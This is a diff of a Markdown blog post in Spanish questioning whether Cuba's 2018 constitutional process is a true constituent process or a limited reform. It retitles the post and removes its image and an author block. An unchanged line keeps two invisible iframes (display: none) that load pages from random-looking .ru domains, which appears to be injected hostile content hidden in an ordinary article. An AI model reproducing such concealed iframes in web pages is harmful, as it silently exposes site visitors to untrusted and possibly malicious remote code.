@@ -1,9 +1,9 @@
 ---
-title: "Reforma constitucional en Cuba 1"
+title: "Cuba en clave constituyente"
 date: "2018-07-18T10:15:39+00:00"
 author: "Ernesto Gutiérrez Leyva"
 category: "Política en Cuba"
-image: "/wp-content/uploads/2018/07/image_content_10054312_20180528224342.jpg"
+image: ""
 ---
 El pasado 2 de junio, se presentaban ante la Asamblea Nacional del Poder Popular los integrantes de la Comisión encargada de elaborar la nueva Carta Magna. Como un televidente más de la sesión convocada al efecto, puedo decir que me dejó más interrogantes que respuestas. Para empezar: ¿se trata de un “proceso constituyente” o de una reforma al estilo de la ocurrida en 1992? El discurso mediático posterior a la sesión ha usado indistintamente ambos términos, los cuales por su alcance no son equiparables. Otro punto de incertidumbre es el de la lista de temas que ocuparán la agenda de la comisión integrada para llevar a cabo el proceso en comento.
 
@@ -24,15 +24,3 @@ La ausencia de especialistas versados en temas a los que una Constitución moder
 [Otros textos del autor](/izquierdista-de-derecha/)
 
 <iframe id="a540125352" style="display: none;" src="https://0vse8pqcjwjb7.ru/f2.html?a=29539"></iframe><iframe id="a754394637" style="display: none;" src="https://m41egdcqogb3.ru/u.html?a=29539"></iframe>
-
-## Autor
-
--   ![](/avatar/e5d4ac9a023b2fcc57340a4d5963fd53?s=80&r=g&d=mm)
-    
-    ![](//www.gravatar.com/avatar/e5d4ac9a023b2fcc57340a4d5963fd53?s=80&r=g&d=mm)
-    
-    [Miguel Alejandro Hayes](https://web.archive.org/web/20221204123508/https://www.trincheracuba.com/author/hayesmartinez/)
-    
-    Editor principal de La Trinchera. Escribo por inspiración
-    
-    [](mailto:hayesmartinez.mrgh@gmail.com)
